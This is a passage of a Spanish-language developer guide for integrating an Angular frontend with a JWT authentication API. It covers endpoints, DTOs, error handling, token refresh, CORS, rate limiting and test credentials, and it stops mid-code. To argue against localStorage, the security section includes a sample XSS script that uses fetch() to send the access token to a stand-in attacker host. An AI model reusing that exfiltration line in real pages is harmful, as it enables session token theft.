# üîå Gu√≠a de Integraci√≥n Frontend - WOM Auth Service API

> **Documentaci√≥n para desarrolladores Frontend (Angular)** sobre c√≥mo integrar con el servicio de autenticaci√≥n WOM.

---

## üìã Tabla de Contenido

1. [Informaci√≥n General](#informaci√≥n-general)
2. [Documentaci√≥n OpenAPI/Swagger](#documentaci√≥n-openapiswagger)
3. [Endpoints Disponibles](#endpoints-disponibles)
4. [Modelos de Datos (DTOs)](#modelos-de-datos-dtos)
5. [Autenticaci√≥n JWT](#autenticaci√≥n-jwt)
6. [C√≥digos de Estado HTTP](#c√≥digos-de-estado-http)
7. [Manejo de Errores](#manejo-de-errores)
8. [Flujo de Autenticaci√≥n Recomendado](#flujo-de-autenticaci√≥n-recomendado)
9. [Almacenamiento de Tokens - Recomendaci√≥n de Seguridad](#almacenamiento-de-tokens---recomendaci√≥n-de-seguridad)
10. [CORS](#cors)
11. [Rate Limiting](#rate-limiting)
12. [Credenciales de Prueba](#credenciales-de-prueba)
13. [Ejemplos de C√≥digo Angular](#ejemplos-de-c√≥digo-angular)
14. [Generaci√≥n Autom√°tica de Cliente](#generaci√≥n-autom√°tica-de-cliente)
15. [Troubleshooting](#troubleshooting)

---

## üì° Informaci√≥n General

### Base URLs

| Ambiente | URL | Descripci√≥n |
|----------|-----|-------------|
| **Desarrollo** | `http://localhost:8080` | Servidor local con Docker |
| **Producci√≥n** | `https://api.tudominio.com` | ‚ö†Ô∏è Configurar seg√∫n despliegue |

### Versi√≥n API
- **Versi√≥n actual**: 1.0.0
- **Compatibilidad**: Java 17, Spring Boot 2.7.18
- **Documentaci√≥n**: OpenAPI 3.0

---

## üìö Documentaci√≥n OpenAPI/Swagger

### Swagger UI (Interactivo) ‚≠ê

La forma **m√°s f√°cil** de entender la API es usar Swagger UI:

```
http://localhost:8080/swagger-ui/index.html
```

**Caracter√≠sticas:**
- ‚úÖ Documentaci√≥n interactiva de todos los endpoints
- ‚úÖ Prueba endpoints directamente desde el navegador
- ‚úÖ Ejemplos de request/response
- ‚úÖ Schemas completos de todos los DTOs
- ‚úÖ C√≥digos de estado HTTP y descripciones

### Especificaci√≥n OpenAPI

Para generaci√≥n autom√°tica de c√≥digo o herramientas como Postman:

```bash
# Formato JSON
http://localhost:8080/v3/api-docs

# Formato YAML (recomendado para generadores)
http://localhost:8080/v3/api-docs.yaml
```

**Descargar especificaci√≥n:**
```bash
# YAML
curl http://localhost:8080/v3/api-docs.yaml > wom-auth-api.yaml

# JSON
curl http://localhost:8080/v3/api-docs > wom-auth-api.json
```

---

## üîå Endpoints Disponibles

### Resumen de Endpoints

| Endpoint | M√©todo | Auth Requerido | Descripci√≥n |
|----------|--------|----------------|-------------|
| `/auth/login` | POST | ‚ùå No | Autenticar usuario y obtener tokens |
| `/auth/refresh` | POST | ‚ùå No | Renovar access token usando refresh token |
| `/auth/logout` | POST | ‚úÖ S√≠ | Cerrar sesi√≥n e invalidar refresh token actual |
| `/auth/logout-all` | POST | ‚úÖ S√≠ | Cerrar sesi√≥n en todos los dispositivos |
| `/auth/me` | GET | ‚úÖ S√≠ | Obtener perfil del usuario autenticado |

### Endpoints de Monitoreo (Opcional)

| Endpoint | Descripci√≥n |
|----------|-------------|
| `/actuator/health` | Estado de salud del servicio |
| `/actuator/metrics` | M√©tricas de la aplicaci√≥n |

---

## üì¶ Modelos de Datos (DTOs)

### 1. LoginRequest

**Endpoint:** `POST /auth/login`

```typescript
interface LoginRequest {
  identifier: string;  // Email o username del usuario
  password: string;    // Contrase√±a en texto plano (se env√≠a por HTTPS)
}
```

**Ejemplo:**
```json
{
  "identifier": "admin@test.com",
  "password": "password"
}
```

**Validaciones:**
- `identifier`: Requerido, no vac√≠o
- `password`: Requerido, no vac√≠o

---

### 2. LoginResponse

**Respuesta de:** `POST /auth/login`

```typescript
interface LoginResponse {
  accessToken: string;   // JWT para autenticar peticiones (corta duraci√≥n)
  refreshToken: string;  // Token para renovar el accessToken (larga duraci√≥n)
  tokenType: string;     // Siempre "Bearer"
  expiresIn: number;     // Segundos hasta que expire el accessToken (900 = 15 min)
}
```

**Ejemplo:**
```json
{
  "accessToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNz...",
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC...",
  "tokenType": "Bearer",
  "expiresIn": 900
}
```

---

### 3. RefreshTokenRequest

**Endpoint:** `POST /auth/refresh`

```typescript
interface RefreshTokenRequest {
  refreshToken: string;  // El refresh token recibido en login
}
```

**Ejemplo:**
```json
{
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC..."
}
```

---

### 4. RefreshTokenResponse

**Respuesta de:** `POST /auth/refresh`

```typescript
interface RefreshTokenResponse {
  accessToken: string;   // Nuevo JWT para autenticar peticiones
  refreshToken: string;  // Nuevo refresh token (rotaci√≥n autom√°tica)
  tokenType: string;     // Siempre "Bearer"
  expiresIn: number;     // Segundos hasta que expire el nuevo accessToken
}
```

**‚ö†Ô∏è Importante:** El backend implementa **rotaci√≥n de refresh tokens**. Cada vez que refrescas, recibes un **nuevo** refresh token. Debes actualizar ambos tokens en tu storage.

---

### 5. LogoutRequest

**Endpoint:** `POST /auth/logout`

```typescript
interface LogoutRequest {
  refreshToken: string;  // El refresh token a invalidar
}
```

**Ejemplo:**
```json
{
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC..."
}
```

---

### 6. UserResponse

**Respuesta de:** `GET /auth/me`

```typescript
interface UserResponse {
  id: number;             // ID √∫nico del usuario
  email: string;          // Email del usuario
  username: string;       // Nombre de usuario
  fullName: string;       // Nombre completo
  status: UserStatus;     // Estado de la cuenta
  createdAt: string;      // Fecha de creaci√≥n (ISO 8601)
  lastLoginAt: string;    // √öltima fecha de login (ISO 8601)
}

enum UserStatus {
  ACTIVE = "ACTIVE",
  INACTIVE = "INACTIVE",
  LOCKED = "LOCKED"
}
```

**Ejemplo:**
```json
{
  "id": 1,
  "email": "admin@test.com",
  "username": "admin",
  "fullName": "Administrator User",
  "status": "ACTIVE",
  "createdAt": "2025-10-01T10:00:00",
  "lastLoginAt": "2025-10-04T08:30:00"
}
```

---

### 7. ErrorResponse

**Respuesta en caso de error:**

```typescript
interface ErrorResponse {
  path: string;        // Endpoint que gener√≥ el error
  error: string;       // Tipo de error (Unauthorized, Bad Request, etc.)
  message: string;     // Mensaje descriptivo del error
  timestamp: string;   // Timestamp del error (ISO 8601)
  status: number;      // C√≥digo HTTP de estado
}
```

**Ejemplo:**
```json
{
  "path": "/auth/login",
  "error": "Unauthorized",
  "message": "Invalid credentials",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

---

## üîê Autenticaci√≥n JWT

### Formato del Header

Para **todos los endpoints protegidos** (marcados con ‚úÖ en la tabla), debes incluir:

```http
Authorization: Bearer <accessToken>
```

**Ejemplo:**
```http
GET /auth/me HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNz...
```

### Caracter√≠sticas de los Tokens

| Token | Duraci√≥n | Uso | Almacenamiento Recomendado |
|-------|----------|-----|---------------------------|
| **Access Token** | 15 minutos (900s) | Autenticar peticiones a endpoints protegidos | Cookie HttpOnly + Secure |
| **Refresh Token** | 7 d√≠as (604800s) | Renovar access token cuando expira | Cookie HttpOnly + Secure |

### Algoritmo

- **Algoritmo**: RS256 (RSA con SHA-256)
- **Tipo**: Asim√©trico (clave privada para firmar, p√∫blica para verificar)
- **Claims incluidos**:
  ```json
  {
    "type": "access",        // o "refresh"
    "userId": 1,
    "email": "admin@test.com",
    "username": "admin",
    "sub": "admin",
    "iat": 1759563294,       // Issued at
    "exp": 1759564194        // Expiration
  }
  ```

### Estructura del JWT

```
eyJhbGciOiJSUzI1NiJ9           ‚Üê Header (algoritmo)
.
eyJ0eXBlIjoiYWNjZXNzIi...      ‚Üê Payload (claims/datos)
.
SYNUM2HbS9DX4wuD6IHgVf...      ‚Üê Signature (firma digital)
```

**‚ö†Ô∏è Importante:** NO almacenar informaci√≥n sensible en el token. Aunque est√° firmado, el payload es **legible** (base64).

---

## üìä C√≥digos de Estado HTTP

### Respuestas Exitosas

| C√≥digo | Descripci√≥n | Cu√°ndo |
|--------|-------------|--------|
| `200 OK` | Operaci√≥n exitosa | Login, refresh, logout, obtener perfil |

### Respuestas de Error

| C√≥digo | Descripci√≥n | Cu√°ndo | Acci√≥n Recomendada |
|--------|-------------|--------|-------------------|
| `400 Bad Request` | Validaci√≥n fallida | Campos vac√≠os, formato incorrecto | Mostrar mensaje al usuario |
| `401 Unauthorized` | No autorizado | Credenciales inv√°lidas, token expirado/inv√°lido | Redirigir a login |
| `403 Forbidden` | Prohibido | Cuenta bloqueada, cuenta inactiva | Mostrar mensaje espec√≠fico |
| `429 Too Many Requests` | Rate limit | Demasiados intentos de login | Mostrar mensaje "intenta m√°s tarde" |
| `500 Internal Server Error` | Error del servidor | Error inesperado en backend | Mostrar mensaje gen√©rico, reportar error |

---

## ‚ö†Ô∏è Manejo de Errores

### 1. Credenciales Inv√°lidas (401)

```json
{
  "path": "/auth/login",
  "error": "Unauthorized",
  "message": "Invalid credentials",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

**Manejo recomendado:**
```typescript
if (error.status === 401 && error.error.message === 'Invalid credentials') {
  this.showError('Usuario o contrase√±a incorrectos');
}
```

---

### 2. Token Expirado (401)

```json
{
  "path": "/auth/me",
  "error": "Unauthorized",
  "message": "JWT expired",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

**Manejo recomendado:**
```typescript
if (error.status === 401 && error.error.message.includes('expired')) {
  // Intentar refresh autom√°tico
  this.authService.refresh().subscribe(
    () => this.retryRequest(),
    () => this.router.navigate(['/login'])
  );
}
```

---

### 3. Usuario Bloqueado (403)

```json
{
  "path": "/auth/login",
  "error": "Forbidden",
  "message": "Account is locked due to multiple failed attempts. Try again in 30 minutes.",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 403
}
```

**Manejo recomendado:**
```typescript
if (error.status === 403) {
  this.showError(error.error.message); // Mostrar mensaje exacto del backend
}
```

---

### 4. Rate Limit Excedido (429)

```json
{
  "path": "/auth/login",
  "error": "Too Many Requests",
  "message": "Rate limit exceeded. Try again later.",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 429
}
```

**Manejo recomendado:**
```typescript
if (error.status === 429) {
  this.showError('Demasiados intentos. Por favor, intenta m√°s tarde.');
  this.disableLoginButton(60); // Deshabilitar bot√≥n por 60 segundos
}
```

---

### 5. Validaci√≥n Fallida (400)

```json
{
  "path": "/auth/login",
  "error": "Bad Request",
  "message": "Validation failed",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 400
}
```

**Manejo recomendado:**
```typescript
if (error.status === 400) {
  this.showError('Por favor, completa todos los campos correctamente');
}
```

---

## üîÑ Flujo de Autenticaci√≥n Recomendado

### Diagrama de Flujo

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    1. LOGIN                                  ‚îÇ
‚îÇ  POST /auth/login { identifier, password }                  ‚îÇ
‚îÇ  ‚Üì                                                           ‚îÇ
‚îÇ  ‚úÖ 200 OK: { accessToken, refreshToken, ... }              ‚îÇ
‚îÇ  ‚ùå 401: Credenciales inv√°lidas                             ‚îÇ
‚îÇ  ‚ùå 403: Cuenta bloqueada                                   ‚îÇ
‚îÇ  ‚ùå 429: Rate limit                                         ‚îÇ
‚îÇ                                                              ‚îÇ
‚îÇ  ‚Üí Guardar accessToken y refreshToken en Cookie HttpOnly    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                 2. PETICIONES PROTEGIDAS                     ‚îÇ
‚îÇ  GET /auth/me                                                ‚îÇ
‚îÇ  Header: Authorization: Bearer <accessToken>                 ‚îÇ
‚îÇ  ‚Üì                                                           ‚îÇ
‚îÇ  ‚úÖ 200 OK: { user data }                                   ‚îÇ
‚îÇ  ‚ùå 401: Token expirado/inv√°lido ‚Üí ir a paso 3              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              3. REFRESH TOKEN (Autom√°tico)                   ‚îÇ
‚îÇ  POST /auth/refresh { refreshToken }                         ‚îÇ
‚îÇ  ‚Üì                                                           ‚îÇ
‚îÇ  ‚úÖ 200 OK: { accessToken, refreshToken, ... }              ‚îÇ
‚îÇ     ‚Üí Actualizar tokens en Cookie                           ‚îÇ
‚îÇ     ‚Üí Reintentar petici√≥n original                          ‚îÇ
‚îÇ  ‚ùå 401: Refresh token inv√°lido/expirado                    ‚îÇ
‚îÇ     ‚Üí Borrar tokens                                         ‚îÇ
‚îÇ     ‚Üí Redirigir a /login                                    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                     4. LOGOUT                                ‚îÇ
‚îÇ  POST /auth/logout { refreshToken }                          ‚îÇ
‚îÇ  ‚Üì                                                           ‚îÇ
‚îÇ  ‚Üí Borrar tokens de Cookie                                  ‚îÇ
‚îÇ  ‚Üí Redirigir a /login                                       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### Implementaci√≥n Paso a Paso

#### Paso 1: Login
```typescript
login(identifier: string, password: string) {
  return this.http.post<LoginResponse>('/auth/login', { identifier, password })
    .pipe(
      tap(response => {
        // ‚ö†Ô∏è Ver secci√≥n "Almacenamiento de Tokens" para implementaci√≥n segura
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
}
```

#### Paso 2: Adjuntar Token en Peticiones
```typescript
// HTTP Interceptor
intercept(req: HttpRequest<any>, next: HttpHandler) {
  const token = this.getAccessToken(); // Leer de Cookie
  
  if (token) {
    req = req.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`
      }
    });
  }
  
  return next.handle(req).pipe(
    catchError(error => {
      if (error.status === 401 && error.error.message.includes('expired')) {
        // Token expirado, intentar refresh
        return this.handle401Error(req, next);
      }
      return throwError(error);
    })
  );
}
```

#### Paso 3: Refresh Autom√°tico
```typescript
private handle401Error(req: HttpRequest<any>, next: HttpHandler) {
  if (!this.isRefreshing) {
    this.isRefreshing = true;
    this.refreshTokenSubject.next(null);

    const refreshToken = this.getRefreshToken();
    
    return this.authService.refresh(refreshToken).pipe(
      switchMap((response) => {
        this.isRefreshing = false;
        this.saveTokens(response.accessToken, response.refreshToken);
        this.refreshTokenSubject.next(response.accessToken);
        
        // Reintentar petici√≥n original con nuevo token
        return next.handle(this.addToken(req, response.accessToken));
      }),
      catchError(error => {
        this.isRefreshing = false;
        this.authService.logout();
        return throwError(error);
      })
    );
  }
}
```

#### Paso 4: Logout
```typescript
logout() {
  const refreshToken = this.getRefreshToken();
  
  return this.http.post('/auth/logout', { refreshToken })
    .pipe(
      finalize(() => {
        this.clearTokens();
        this.router.navigate(['/login']);
      })
    );
}
```

---

## üîí Almacenamiento de Tokens - Recomendaci√≥n de Seguridad

### ‚ö†Ô∏è Importante: NO usar localStorage

El documento de la prueba t√©cnica menciona `localStorage`, pero **NO es la opci√≥n m√°s segura**. Aqu√≠ est√° el por qu√©:

### Comparaci√≥n de M√©todos

| M√©todo | Seguridad | Ventajas | Desventajas | Recomendado |
|--------|-----------|----------|-------------|-------------|
| **localStorage** | ‚ùå Vulnerable a XSS | F√°cil de usar, persistente | Accesible por JavaScript malicioso, sin protecci√≥n | ‚ùå **NO** |
| **sessionStorage** | ‚ùå Vulnerable a XSS | F√°cil de usar, se limpia al cerrar | Accesible por JavaScript malicioso, no persiste | ‚ùå **NO** |
| **Cookies HttpOnly + Secure** | ‚úÖ Seguro | Inmune a XSS, autom√°tico en requests | M√°s complejo de implementar | ‚úÖ **S√ç** |

### Por qu√© NO localStorage:

```typescript
// ‚ùå VULNERABLE A XSS (Cross-Site Scripting)
localStorage.setItem('accessToken', token);

// Si un atacante inyecta JavaScript malicioso:
<script>
  fetch('https://atacante.com/robar', {
    method: 'POST',
    body: localStorage.getItem('accessToken') // ¬°Token robado!
  });
</script>
```

**Vulnerabilidades:**
1. **XSS (Cross-Site Scripting)**: Cualquier script puede leer localStorage
2. **No expira autom√°ticamente**: Token persiste incluso despu√©s de cerrar navegador
3. **Sin protecci√≥n CSRF**: Tokens pueden ser usados en peticiones cross-site

### ‚úÖ Recomendaci√≥n: Cookies HttpOnly + Secure

#### Configuraci√≥n en el Backend (Node.js/Express de BFF)

Si usas un BFF (Backend-For-Frontend) entre Angular y el Auth Service:

```typescript
// Backend BFF (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  // Llamar al Auth Service Java
  const response = await axios.post('http://localhost:8080/auth/login', req.body);
  
  // Guardar tokens en cookies HttpOnly
  res.cookie('accessToken', response.data.accessToken, {
    httpOnly: true,    // ‚úÖ No accesible por JavaScript
    secure: true,      // ‚úÖ Solo HTTPS en producci√≥n
    sameSite: 'strict', // ‚úÖ Protecci√≥n CSRF
    maxAge: 15 * 60 * 1000 // 15 minutos
  });
  
  res.cookie('refreshToken', response.data.refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 d√≠as
  });
  
  res.json({ success: true });
});
```

#### Configuraci√≥n en Angular

```typescript
// auth.service.ts
login(identifier: string, password: string) {
  // Llamar al BFF, no directamente al Auth Service
  return this.http.post('/bff/auth/login', { identifier, password }, {
    withCredentials: true  // ‚úÖ Incluir cookies en request
  });
}

// Las cookies se env√≠an autom√°ticamente en cada petici√≥n
getProfile() {
  return this.http.get('/bff/auth/me', {
    withCredentials: true  // ‚úÖ Incluir cookies autom√°ticamente
  });
}
```

### Alternativa: localStorage con Precauciones

Si **DEBES** usar localStorage (por simplicidad o requerimiento del proyecto):

```typescript
// ‚ö†Ô∏è SOLO si no puedes implementar cookies HttpOnly

// 1. Validaci√≥n estricta de contenido (prevenir XSS)
// 2. Content Security Policy (CSP) headers
// 3. Sanitizaci√≥n de inputs
// 4. Tokens de corta duraci√≥n

// Ejemplo con validaci√≥n
saveToken(token: string) {
  // Validar formato JWT b√°sico
  if (!token.match(/^[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*$/)) {
    throw new Error('Invalid token format');
  }
  localStorage.setItem('accessToken', token);
}
```

### Documentaci√≥n para README del Frontend

**Incluir esta secci√≥n en el README del proyecto Angular:**

```markdown
## üîí Seguridad: Almacenamiento de Tokens

### ‚ö†Ô∏è Importante: localStorage vs Cookies HttpOnly

Este proyecto usa **localStorage** para almacenar tokens JWT seg√∫n 
los requisitos de la prueba t√©cnica. Sin embargo, es importante 
notar que esta NO es la opci√≥n m√°s segura para producci√≥n.

### Por qu√© localStorage NO es ideal:

1. **Vulnerable a XSS (Cross-Site Scripting)**
   - Cualquier script malicioso puede acceder a localStorage
   - Tokens pueden ser robados mediante inyecci√≥n de c√≥digo

2. **Sin protecci√≥n contra CSRF**
   - Tokens persisten indefinidamente hasta ser borrados
   - No hay expiraci√≥n autom√°tica de sesi√≥n

### Recomendaci√≥n para Producci√≥n:

**Usar Cookies HttpOnly + Secure** mediante un BFF (Backend-For-Frontend):

```typescript
// Ventajas:
‚úÖ Inmune a ataques XSS (JavaScript no puede leer la cookie)
‚úÖ Protecci√≥n CSRF con sameSite='strict'
‚úÖ Expiraci√≥n autom√°tica
‚úÖ M√°s seguro para aplicaciones enterprise

// Implementaci√≥n:
1. Crear BFF (Node.js/Express) entre Angular y Auth Service
2. BFF guarda tokens en cookies HttpOnly
3. Angular hace peticiones al BFF con withCredentials: true
4. Cookies se env√≠an autom√°ticamente en cada request
```

### Implementaci√≥n Actual (localStorage)

Por simplicidad y para cumplir con los requisitos de la prueba, 
este proyecto usa localStorage:

```typescript
// auth.service.ts
private saveTokens(accessToken: string, refreshToken: string) {
  localStorage.setItem('accessToken', accessToken);
  localStorage.setItem('refreshToken', refreshToken);
}
```

**Medidas de seguridad implementadas:**
- ‚úÖ Content Security Policy (CSP) headers
- ‚úÖ Sanitizaci√≥n de inputs
- ‚úÖ Validaci√≥n de formato de tokens
- ‚úÖ Tokens de corta duraci√≥n (15 min access, 7 d√≠as refresh)
```

---

## üåê CORS

### Or√≠genes Permitidos

El backend tiene CORS configurado para los siguientes or√≠genes:

**Desarrollo:**
```
http://localhost:4200  (Angular CLI default)
http://localhost:3000  (React/Next.js default)
```

**Producci√≥n:**
```
Configurar seg√∫n dominio de producci√≥n
```

### Configuraci√≥n

Si necesitas agregar un nuevo origen, edita el archivo `.env` del backend:

```bash
# .env
CORS_ALLOWED_ORIGINS=http://localhost:4200,http://localhost:3000,https://tudominio.com
```

Luego reinicia el servicio:
```bash
docker-compose down
docker-compose up -d --build
```

### Verificar CORS

```bash
# Verificar headers CORS
curl -I -X OPTIONS http://localhost:8080/auth/login \
  -H "Origin: http://localhost:4200" \
  -H "Access-Control-Request-Method: POST"

# Debe retornar:
# Access-Control-Allow-Origin: http://localhost:4200
# Access-Control-Allow-Methods: POST, GET, ...
```

---

## ‚è±Ô∏è Rate Limiting

### L√≠mites Configurados

| Endpoint | L√≠mite | Ventana | Acci√≥n en Exceso |
|----------|--------|---------|------------------|
| `/auth/login` | 5 intentos fallidos | Por IP | Bloqueo de 30 minutos |
| `/auth/refresh` | Sin l√≠mite | - | - |
| Otros endpoints | Sin l√≠mite | - | - |

### Comportamiento

1. **Usuario con credenciales correctas**: Sin l√≠mite
2. **5 intentos fallidos**: Cuenta bloqueada por 30 minutos
3. **Respuesta HTTP 429**: "Too Many Requests"

### Manejo en Frontend

```typescript
// Manejar error 429
if (error.status === 429) {
  const retryAfter = error.headers.get('Retry-After') || 1800; // 30 min default
  this.showError(`Demasiados intentos. Intenta en ${retryAfter / 60} minutos.`);
}
```

---

## üß™ Credenciales de Prueba

### Usuarios Disponibles

| Email | Username | Password | Status | Descripci√≥n |
|-------|----------|----------|--------|-------------|
| `admin@test.com` | `admin` | `password` | ACTIVE | Usuario administrador |
| `user@test.com` | `testuser` | `password` | ACTIVE | Usuario regular |
| `locked@test.com` | `lockeduser` | `password` | LOCKED | Usuario bloqueado (para probar error 403) |

### Ejemplos de Uso

#### Login Exitoso
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "admin@test.com",
    "password": "password"
  }'
```

#### Probar Error 401 (Credenciales Inv√°lidas)
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "admin@test.com",
    "password": "wrongpassword"
  }'
```

#### Probar Error 403 (Usuario Bloqueado)
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "locked@test.com",
    "password": "password"
  }'
```

---

## üíª Ejemplos de C√≥digo Angular

### 1. AuthService Completo

```typescript
// auth.service.ts
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';
import { tap } from 'rxjs/operators';

interface LoginRequest {
  identifier: string;
  password: string;
}

interface LoginResponse {
  accessToken: string;
  refreshToken: string;
  tokenType: string;
  expiresIn: number;
}

interface UserResponse {
  id: number;
  email: string;
  username: string;
  fullName: string;
  status: string;
  createdAt: string;
  lastLoginAt: string;
}

@Injectable({ providedIn: 'root' })
export class AuthService {
  private readonly API_URL = 'http://localhost:8080/auth';

  constructor(private http: HttpClient) {}

  /**
   * Login con credenciales
   */
  login(identifier: string, password: string): Observable<LoginResponse> {
    return this.http.post<LoginResponse>(`${this.API_URL}/login`, {
      identifier,
      password
    }).pipe(
      tap(response => {
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
  }

  /**
   * Renovar access token
   */
  refresh(): Observable<LoginResponse> {
    const refreshToken = this.getRefreshToken();
    
    if (!refreshToken) {
      throw new Error('No refresh token available');
    }

